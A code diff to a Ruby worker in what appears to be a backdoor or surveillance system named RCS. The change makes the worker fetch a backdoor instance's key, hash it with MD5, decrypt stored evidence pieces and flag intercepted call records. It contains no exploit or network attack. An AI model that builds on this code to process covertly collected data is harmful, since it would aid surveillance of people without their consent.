@@ -4,8 +4,13 @@
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/evidence'
+require 'rcs-common/evidence_manager'
+
+# from RCS::
 
 # form System
+require 'digest/md5'
 require 'optparse'
 
 module RCS
@@ -13,24 +18,59 @@ module Worker
 
 class Worker
   include Tracer
-
+  
   attr_reader :type
-
+  
   def initialize(db_file, type)
-
+    
     # db file where evidence to be processed are stored
-    @db_file = db_file
-
+    @instance = db_file
+    
     # type of evidences to be processed
     @type = type
-
-    trace :info, "Working on evidence stored in #{@db_file}."
-    trace :info, "Processing evidence of type #{@type.to_s}."
+    
+    trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
+    
+  end
+  
+  def get_key()
+    
   end
   
   def process
-    trace :info, "Starting to process evidence."
-    sleep 1
+    require 'pp'
+    
+    info = RCS::EvidenceManager.instance.get_info(@instance)
+    trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
+    
+    # the log key is passed as a string taken from the db
+    # we need to calculate the MD5 and use it in binary form
+    trace :debug, "Evidence key #{info['key']}"
+    evidence_key = Digest::MD5.digest info['key']
+    
+    evidence_sizes = RCS::EvidenceManager.instance.get_info_evidence(@instance)
+    evidence_ids = RCS::EvidenceManager.instance.get_evidence_ids(@instance)
+    trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
+    
+    evidence_ids.each do |id|
+      binary = RCS::EvidenceManager.instance.get_evidence(id, @instance)
+      trace :info, "Processing evidence #{id}: #{binary.size} bytes."
+      begin
+        evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
+        case evidence.info[:type]
+          when :CALL
+            puts "CALL EVIDENCE!"
+          else
+            puts "JUNK EVIDENCE :("
+        end
+      rescue Exception => e
+        trace :fatal, "FAILURE: " << e.to_s
+        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+      end
+        
+      # trace :info, "Evidence from device #{evidence.info[:device_id]}, user #{evidence.info[:user_id]}."
+    end
+    
     trace :info, "All evidence has been processed."
   end
 end
@@ -65,7 +105,7 @@ class Application
     begin
       version = File.read(Dir.pwd + '/config/version.txt')
       trace :info, "Starting a RCS Worker #{version}..."
-      w = RCS::Worker::Worker.new(file, options[:type])
+      w = RCS::Worker::Worker.new(File.basename(file), options[:type])
       w.process
     rescue Exception => e
       trace :fatal, "FAILURE: " << e.to_s
